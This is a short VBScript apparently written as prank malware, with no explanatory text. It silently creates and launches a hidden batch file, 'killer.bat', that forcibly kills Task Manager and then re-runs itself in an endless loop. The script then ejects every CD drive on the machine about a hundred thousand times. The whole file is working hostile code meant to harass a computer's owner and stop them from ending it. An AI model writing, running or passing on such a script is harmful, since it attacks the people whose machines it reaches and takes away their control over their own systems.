Option Explicit
Dim objFSO, objFile, oWMP, colCDROMS
Const REPEAT = 100000
Const PAYLOAD1 = "@echo off && taskkill /F /IM Taskmgr.exe"
Const PAYLOAD2 = "%0" 
Const CHILD = "killer.bat"
Const REPEATER = 100000
Const ForWriting = 2
Const Create = true

Set oWMP = CreateObject("WMPlayer.OCX" )
Set colCDROMs = oWMP.cdromCollection
Set objFSO = Wscript.CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile(CHILD, ForWriting, Create)

objFile.WriteLine PAYLOAD1
objFile.WriteLine PAYLOAD2
objFile.close
Set objFile = nothing
Set objFSO = nothing

CreateObject("Wscript.Shell").Run """" & CHILD & """", 0, False

For x=0 to repeat
If colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
Wscript.Sleep 500
If colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
Next